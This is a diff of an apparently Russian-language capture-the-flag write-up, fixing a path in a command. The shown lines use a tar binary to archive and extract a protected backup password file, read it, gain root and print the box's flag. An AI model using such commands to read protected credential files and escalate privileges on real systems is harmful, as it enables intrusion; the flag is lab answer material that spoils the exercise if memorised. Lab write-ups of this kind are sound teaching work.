@@ -85,7 +85,7 @@ p-->
 
 ./tar -cf pass.tar /var/backups/.old_pass.bak
 tar -xf pass.tar 
-cat var/backups/.old_pass.bak
+cat /var/backups/.old_pass.bak
 
 Эти команды помогли мне открыть файл.Я нашел пароль и получил root. В директории /root. находился флаг -- 
 3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}
